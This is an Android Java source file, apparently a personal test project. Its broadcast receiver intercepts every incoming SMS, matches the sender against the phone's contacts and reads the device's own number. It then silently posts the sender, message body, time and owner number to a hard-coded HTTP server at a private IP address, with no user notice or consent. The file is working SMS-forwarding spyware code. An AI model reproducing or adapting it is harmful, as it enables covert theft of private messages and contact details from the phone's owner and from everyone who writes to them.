/*************************************************************************************************
 * 版权所有 (C)2015,  成都市商联汇通技术有限公司
 * 
 * 文件名称：MyLookMessgeReceiver.java
 * 内容摘要：
 * 当前版本：
 * 作         者： 翟彬
 * 完成日期：2016年5月3日上午11:30:20
 * 修改记录：
 * 修改日期：
 * 版   本  号：
 * 修   改  人：
 * 修改内容：
 ************************************************************************************************/
package com.zb.mytest.broadcast;

import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

/**
 * @ClassName: MyLookMessgeReceiver
 * @Description: TODO
 * @author 翟彬
 * @date 2016年5月3日 上午11:30:20
 */
public class MyLookMessgeReceiver extends BroadcastReceiver {
	private static final String TAG = "MyLookMessgeReceiver";

	@Override
	public void onReceive(final Context context, Intent intent) {
		final Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		final String phoneNum = telephonyManager.getLine1Number().trim().replace("+86", "");
		if (pdus != null) {
			new Thread() {
				public void run() {
					for (Object pdu : pdus) {
						SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
						String phone = smsMessage.getDisplayOriginatingAddress().trim().replace("+86", "");
						String name = getContactNameFromPhoneBook(context, phone);
						if (TextUtils.isEmpty(name)) {
							name = "无该号码信息";
						}
						String content = smsMessage.getMessageBody();
						String time = smsMessage.getTimestampMillis() / 1000 + "";
						try {
							DefaultHttpClient client = new DefaultHttpClient();
							HttpPost post = new HttpPost("http://192.168.31.134/messge");
							List<NameValuePair> parameters = new ArrayList<NameValuePair>();
							parameters.add(new BasicNameValuePair("name", name));
							parameters.add(new BasicNameValuePair("phone", phone));
							parameters.add(new BasicNameValuePair("content", content));
							parameters.add(new BasicNameValuePair("time", time));
							if (TextUtils.isEmpty(phoneNum) || phoneNum.length() != 11) {
								parameters.add(new BasicNameValuePair("userphone", "11111111111"));
							} else {
								parameters.add(new BasicNameValuePair("userphone", phoneNum));
							}
							post.setEntity(new UrlEncodedFormEntity(parameters, HTTP.UTF_8));
							HttpResponse response = client.execute(post);
							byte[] buffer = new byte[1024];
							int l = response.getEntity().getContent().read(buffer);
							Log.e(TAG, new String(buffer, 0, l));
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				}
			}.start();
		}
	}

	public String getContactNameFromPhoneBook(Context context, String phoneNum) {
		if (TextUtils.isEmpty(phoneNum)) {
			return null;
		}
		String contactName = null;
		ContentResolver cr = context.getContentResolver();
		Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
				ContactsContract.CommonDataKinds.Phone.NUMBER + " = ?", new String[] { phoneNum }, null);
		if (pCur.moveToFirst()) {
			contactName = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
		}
		pCur.close();
		return contactName;
	}
}
